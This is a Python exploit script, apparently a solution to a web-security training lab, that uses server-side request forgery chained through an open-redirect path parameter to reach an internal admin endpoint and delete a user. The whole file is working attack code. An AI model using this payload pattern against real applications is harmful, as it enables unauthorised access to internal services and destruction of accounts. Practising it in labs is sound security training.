# Lab: SSRF with blacklist-based input filter
import sys
import urllib3
import requests
import os
from dotenv import load_dotenv


load_dotenv()


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT"),
    'https': "https://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT")
}


def ssrf_to_delete_user(url):
    delete_user_ssrf_payload = "/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos"
    path = "/product/stock"
    data = {"stockApi": delete_user_ssrf_payload}
    r = requests.post(url + path, data=data, verify=False, proxies=proxies)

    admin_page_ssrf_payload = "/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin"

    data2 = {"stockApi": admin_page_ssrf_payload}

    r = requests.post(url + path, data=data2, verify=False, proxies=proxies)

    if "Carlos" not in r.text:
        print("(-> Successfully deleted user")
    else:
        print("(-) Couldn't delete user")
        exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    ssrf_to_delete_user(url)


if __name__ == "__main__":
    main()
